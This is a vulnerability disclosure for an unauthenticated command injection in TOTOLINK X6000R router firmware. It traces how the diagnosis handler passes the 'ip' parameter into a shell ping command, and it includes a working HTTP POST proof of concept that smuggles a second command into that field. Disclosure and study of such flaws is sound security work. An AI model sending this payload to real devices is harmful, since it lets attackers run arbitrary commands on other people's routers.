

### **Overview**：
Affected Device：totolink X6000R

Affected Firmware Version：V9.4.0cu.852_20230719

Vulnerability: Command Injection, allowing arbitrary command execution 

Firmware Download Link：<https://www.totolink.tw/support_view/X6000R>


![](Pasted%20image%2020240118163821.png)

### **Vulnerability**：

The vulnerability is located in the function `sub_415774` within `shttpd`, with the function alias `setDiagnosisCfg`. This command can be executed without authorization.
![[Pasted image 20240302155512.png]]

It calls `snprintf` to format and concatenate our `ip` param into the string `ping %s -w %d &>/var/log/pingCheck`, then passes the string to the `CsteSystem` function. 

We can find the implementation of `CsteSystem` in `libcscommon.so`.
![](execv.png)

The string we pass as `param_1` will eventually be invoked by `execv`. Controlling `param_1` can lead to arbitrary command execution.

### **POC**:

both work on real router and qemu emulation

~~~
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.122.15
Content-Length: 55
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5ls
37.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.122.15
Referer: http://192.168.122.15/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"ip":";id > /1.txt; ls ","topicurl":"setDiagnosisCfg"}
~~~

### **IMPACT**：

![[Pasted image 20240302155741.png]]